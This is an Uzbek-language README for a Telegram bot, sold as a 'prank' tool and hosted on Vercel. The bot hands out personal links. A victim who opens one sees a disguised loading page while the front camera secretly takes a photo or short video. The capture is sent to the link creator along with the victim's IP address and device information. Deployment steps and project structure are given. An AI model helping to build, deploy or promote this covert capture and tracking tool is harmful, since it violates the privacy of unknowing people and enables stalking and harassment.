# 🎯 Telegram Prank (Foto & Video) Bot — Vercel Serverless

Ushbu loyiha Telegram orqali istalgan foydalanuvchiga shaxsiy **Foto** yoki **Video** prank (hazil) havolasi yaratib beradigan to'liq tizimdir.

Hech qanday murakkab serverlar, ma'lumotlar bazasi (MongoDB, Redis va h.k.) yoki qo'shimcha pullik xizmatlar **kerak emas**. Loyiha 100% Vercel platformasida bepul va uzluksiz (24/7) ishlaydi.

---

## 🚀 Qanday ishlaydi?

1. **Foydalanuvchi botga kiradi:** Telegram botga kirib `/start` bosadi.
2. **Bot tanlov beradi:** Bot ikkita inline tugma ko'rsatadi:
   - 📸 **Foto uchun havola**
   - 🎥 **Video uchun havola**
3. **Shaxsiy havola yaratiladi:** Foydalanuvchi tugmani tanlaganda, bot uning `chat_id` raqamiga biriktirilgan shaxsiy havolani taqdim etadi:
   `https://sizning-sayt.vercel.app/?id=12345678&type=photo`
4. **O'lja havolaga kiradi:**
   - Sayt tabiiy ko'rinishda ochiladi ("Sahifa yuklanmoqda...").
   - Telefon yoki kompyuterning old kamerasi orqali darhol **surat** yoki 3 soniyalik **video** yozib olinadi.
5. **Telegramga yetib keladi:** Olingan rasm yoki video bevosita havolani yaratgan odamning Telegramiga yuboriladi (vaqt, o'ljaning IP manzili va qurilmasi bilan birga).

---

## 📁 Loyiha tuzilishi

```text
prank-foto/
├── api/
│   ├── bot.js         # Telegram Bot Webhook (tugmalar, /start, havolalar yaratish)
│   ├── send.js        # Surat va videoni qabul qilib Telegramga yetkazuvchi serverless funksiya
│   └── setWebhook.js  # Webhook-ni brauzerdan 1 klikda ulash uchun sahifa
├── public/
│   └── index.html     # O'lja ochadigan sahifa (kamera va video yozish logikasi)
├── index.html         # Asosiy index.html (zaxira va to'g'ridan-to'g'ri kirish uchun)
├── vercel.json        # Vercel yo'naltirish (routing) konfiguratsiyasi
├── package.json       # Node.js loyiha fayli (hech qanday og'ir kutubxonalarsiz)
└── README.md          # Qo'llanma
```

---

## ⚡️ Vercel-ga joylash (2 daqiqalik qo'llanma)

### 1-usul: GitHub orqali (Eng osoni)
1. Ushbu papkadagi barcha fayllarni o'zingizning yangi **GitHub repozitoriyangizga** yuklang (Push qiling).
2. [vercel.com](https://vercel.com) saytiga kiring va **"Add New" -> "Project"** tugmasini bosing.
3. GitHub repozitoriyangizni tanlang va **Deploy** tugmasini bosing.
4. Saytingiz 15 soniyada tayyor bo'ladi (masalan: `https://sizning-domen.vercel.app`).

### 2-usul: Vercel CLI orqali (Terminalda)
Agar kompyuteringizda Vercel o'rnatilgan bo'lsa:
```bash
vercel
```
Barcha savollarga shunchaki `Enter` bosing.

---

## 🔗 Webhook-ni faollashtirish (Eng qulay usul!)

Sayt Vercel-ga yuklangach, bot Telegram bilan bog'lanishi uchun brauzeringizda ushbu havolani bir marta oching:

👉 `https://sizning-domen.vercel.app/api/setWebhook`

Ekranda:
> ✅ **Telegram Webhook Ulandi!**
yozuvi chiqadi. Bo'ldi! Bot to'liq ishga tushdi.

---

## ⚙️ Sozlamalar (Ixtiyoriy)

Standart holatda sizning bot tokeningiz kod ichiga yozilgan.
Agar boshqa botdan foydalanmoqchi bo'lsangiz, Vercel panelida **Settings -> Environment Variables** bo'limiga kirib:
- `BOT_TOKEN`: `bot_tokeningiz`
- `APP_URL`: `https://sizning-domen.vercel.app` (avtomatik aniqlanadi, xohlasangiz qo'lda kiritishingiz mumkin)

nomli o'zgaruvchilarni kiritishingiz mumkin.

---

## ✨ Afzalliklari

- ✅ **Bosh og'riqsiz:** Baza, Redis, VPS, Docker, port ochish kabi narsalar umuman kerak emas.
- ✅ **Tez va engil:** 0 ta tashqi npm kutubxona, Node 18+ imkoniyatlaridan to'liq foydalanadi.
- ✅ **Ko'p foydalanuvchili (Ommabop):** 1000 kishi botga kirsa ham har biriga o'zining shaxsiy havolasi beriladi va rasmlar faqat o'sha odamga boradi.
- ✅ **Mobil va Safari mosligi:** iPhone (iOS Safari) va Android brauzerlarida kamera va videoni to'g'ri qamrab oladi.
